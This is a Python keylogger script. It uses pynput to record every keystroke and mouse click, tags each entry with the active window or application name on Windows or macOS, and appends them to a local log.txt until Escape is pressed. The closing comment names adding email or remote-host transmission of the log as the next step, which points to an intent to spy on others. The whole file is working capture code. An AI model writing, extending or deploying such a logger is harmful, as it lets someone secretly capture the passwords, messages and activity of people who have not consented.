from pynput import keyboard, mouse
import ctypes
import subprocess
import platform

# ESCAPE KEY USED TO STOP LISTENERS
STOP_KEY = keyboard.Key.esc

# GLOBAL FLAG WHICH WILL CORRESPOND TO STOPKEY TO CEASE BOTH LISTENERS
stop_flag = False

def get_active_window_title():
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        title = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, title, length + 1)
        return title.value if title.value else 'Unknown'
    except Exception as e:
        print(f"An error occurred while getting active window: {e}")
        return 'Unknown'

def get_active_application():
    try:
        script = 'tell application "System Events" to get the name of the first process whose frontmost is true'
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True)
        return result.stdout.strip() if result.stdout else 'Unknown'
    except Exception as e:
        print(f"An error occurred while getting active application: {e}")
        return 'Unknown'

def on_key_press(key):
    global stop_flag
    try:
        app_name = get_active_application() if platform.system() == 'Darwin' else get_active_window_title()
        
        # KEY MAPPING FOR KEYBOARD STROKES
        letter = str(key).replace("'", "")
        if letter == 'Key.space':
            letter = ' '
        elif letter == 'Key.enter':
            letter = '\n'
        elif letter == 'Key.backspace':
            letter = '<BACKSPACE>'
        elif letter == 'Key.tab':
            letter = '<TAB>'
        
        with open("log.txt", 'a', encoding='utf-8') as f:
            f.write(f"[{app_name}] Key {letter}\n")
        
        if key == STOP_KEY:
            stop_flag = True
            return False
    except Exception as e:
        print(f"An error occurred in keyboard handler: {e}")

def on_mouse_click(x, y, button, pressed):
    try:
        app_name = get_active_application() if platform.system() == 'Darwin' else get_active_window_title()
        
        # BUTTON MAPPING FOR MOUSE OPERATIONS
        button_map = {
            mouse.Button.left: 'LCLICK',
            mouse.Button.right: 'RCLICK',
            mouse.Button.middle: 'MCLICK'
        }
        action = 'pressed' if pressed else 'released'
        button_label = button_map.get(button, str(button))
        
        with open("log.txt", 'a', encoding='utf-8') as f:
            f.write(f"[{app_name}] Mouse {action} at ({x}, {y}) with {button_label}\n")
    except Exception as e:
        print(f"An error occurred in mouse handler: {e}")

# CREATES KEYBOARD AND MOUSE LISTENERS UNDER PARAMETER DEFINED CONSTRAINTS (on_press/on_click)
keyboard_listener = keyboard.Listener(on_press=on_key_press)
keyboard_listener.start()
mouse_listener = mouse.Listener(on_click=on_mouse_click)
mouse_listener.start()
keyboard_listener.join() # COMBINES KEYSTROKES RECORDED 

# STOP FLAG CORRESPONDS TO STOPKEY TO SPECIFICALLY STOP MOUSE LISTENER
if stop_flag:
    mouse_listener.stop()

# NEXT STEP IS TO MAKE EMAIL/CONCURRENT COMMUNICATION WITH REMOTE HOST